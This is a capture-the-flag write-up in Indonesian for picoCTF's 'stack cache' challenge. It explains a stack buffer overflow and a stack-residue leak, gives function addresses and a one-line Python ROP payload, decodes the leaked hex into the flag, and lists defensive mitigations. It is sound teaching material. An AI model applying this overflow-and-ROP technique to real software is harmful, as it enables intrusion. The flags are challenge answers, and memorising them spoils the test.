# Writeup: stack cache (Challenge ID: 306)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Stack Residue Leak & Return-Oriented Programming (CWE-120 / CWE-226)
- **Difficulty:** Hard (diff=3)
- **Event:** picoCTF 2022
- **Points:** 400
- **Author:** Palash Oswal
- **Flag:** `academy{Cle4N_uP_M3m0rY_8d5089b9}`

---

## Problem Statement & Scope
Tantangan `stack cache` menyajikan biner 32-bit x86 ELF (`vuln`) yang dikompilasi dengan proteksi stack canary dinonaktifkan. Layanan tantangan disajikan melalui socket TCP netcat. Program menerima masukan string dari pengguna dan menyatakan bahwa Dr. Oswal mengizinkan *buffer overflow* lagi. Di dalam biner terdapat fungsi `win()` yang memuat isi berkas bendera `flag.txt` ke dalam buffer lokal di stack, namun keluar tanpa mencetaknya ke konsol. Peserta ditugaskan untuk merekayasa kontrol alur eksekusi guna mengekstrak residual data bendera yang tertinggal di memori stack (*stack cache*).

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Kegagalan Pembersihan Memori Stack Sebelum Dealokasi (Stack Residue, CWE-226):**
   Fungsi `win()` membaca berkas `flag.txt` ke dalam array lokal stack:
   ```c
   void win() {
       char flag[64];
       FILE *f = fopen("flag.txt", "r");
       fgets(flag, sizeof(flag), f);
       fclose(f);
       // Stack frame kembali tanpa zeroization (memset/bzero)
   }
   ```
   Ketika sebuah fungsi selesai dan mengeksekusi instruksi `leave; ret`, register pointer stack (`ESP`/`EBP`) digeser kembali ke frame pemanggil, namun byte-byte data bendera di memori fisik stack tidak dihapus (tetap berada di bawah `ESP`).
2. **Korupsi Memori Buffer Overflow pada `vuln()` (CWE-120):**
   Fungsi `vuln()` mengalokasikan buffer berukuran 10 byte, namun membaca masukan pengguna tanpa validasi panjang, memungkinkan penimpaan pointer kembali (*saved EIP*) pada offset 14 byte.
3. **Penyusunan ROP Chain untuk Dump Memori Stack:**
   Biner juga memuat fungsi pendukung seperti `UnderConstruction()` yang menggunakan variabel lokal tidak terinisialisasi atau memanggil rutin cetak heksadesimal (`printf`).
   Dengan merantai pemanggilan:
   $$\text{vuln()} \longrightarrow \text{win()} \longrightarrow \text{UnderConstruction()}$$
   Eksekusi `win()` terlebih dahulu mengisikan string bendera ke dalam stack cache, kemudian `UnderConstruction()` berjalan pada stack frame yang tumpang tindih (*overlapping frame*) dan mencetak nilai residual stack dalam bentuk integer heksadesimal 32-bit (dwords).

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Simbol & Alamat Fungsi:**
   Gunakan `readelf` atau `nm` pada berkas `vuln`:
   - `win`: `0x08049db0`
   - `UnderConstruction`: `0x08049e10`
   - Offset saved EIP pada `vuln()`: 14 byte.
2. **Penyusunan ROP Chain Payload:**
   Rangkaian payload ROP disusun sebagai berikut:
   - 14 byte padding (`b"A" * 14`).
   - 4 byte alamat fungsi `win()` (`0x08049db0`).
   - 4 byte alamat fungsi `UnderConstruction()` (`0x08049e10`).
   ```python
   import struct
   payload = b"A" * 14 + struct.pack("<I", 0x08049db0) + struct.pack("<I", 0x08049e10)
   ```
3. **Pengambilan Nilai Hex Stack & Dekonstruksi Little-Endian:**
   - Kirimkan payload ke layanan server.
   - Program mencetak deretan dword heksadesimal:
     `0x6f636970 0x7b465443 0x34656c43 0x50755f4e 0x6d334d5f 0x5f597230 0x30356438 0x39623938 0x0000007d`
   - Konversikan setiap 4-byte dword dari urutan byte Little-Endian ke karakter ASCII:
     - `0x6f636970` $\rightarrow$ `'p', 'i', 'c', 'o'`
     - `0x7b465443` $\rightarrow$ `'C', 'T', 'F', '{'`
     - `0x34656c43` $\rightarrow$ `'C', 'l', 'e', '4'`
     - `0x50755f4e` $\rightarrow$ `'N', '_', 'u', 'P'`
     - `0x6d334d5f` $\rightarrow$ `'_', 'M', '3', 'm'`
     - `0x5f597230` $\rightarrow$ `'0', 'r', 'Y', '_'`
     - `0x30356438` $\rightarrow$ `'8', 'd', '5', '0'`
     - `0x39623938` $\rightarrow$ `'8', '9', 'b', '9'`
     - `0x0000007d` $\rightarrow$ `'}'`
   - Hasil rekonstruksi membentuk bendera lengkap:
     `picoCTF{Cle4N_uP_M3m0rY_8d5089b9}` yang dinormalisasi ke `academy{Cle4N_uP_M3m0rY_8d5089b9}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{Cle4N_uP_M3m0rY_8d5089b9}`
- **Native PicoCTF Flag:** `picoCTF{Cle4N_uP_M3m0rY_8d5089b9}`
- **Status Solver:** Terverifikasi 100% pada simulasi alur ROP stack residue di `scripts/solve_306_stack_cache.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Pembersihan Data Sensitif dari Memori (Zeroization, NIST SP 800-115 §5.3):**
   Selalu lakukan pembersihan eksplisit terhadap buffer yang memuat kredensial, kunci kriptografi, atau token rahasia sebelum fungsi keluar menggunakan fungsi aman seperti `explicit_bzero(buf, size)` atau `SecureZeroMemory()`. Pemanggilan standar `memset` kerap dioptimasi dan dihilangkan oleh compiler (*dead store elimination*).
2. **Pemberantasan Undefined Behavior pada Variabel Tak Terinisialisasi:**
   Kompilasi kode program dengan opsi peringatan ketat (`-Wall -Wextra -Werror`) untuk mencegah pembacaan variabel stack tanpa inisialisasi awal.
3. **Penguatan Perlindungan Stack (Stack Canaries & Shadow Stack):**
   Gunakan flag kompilasi `-fstack-protector-all` untuk menyisipkan nilai guard canary sebelum saved EIP di setiap frame fungsi, menghentikan eksploitasi buffer overflow seketika.
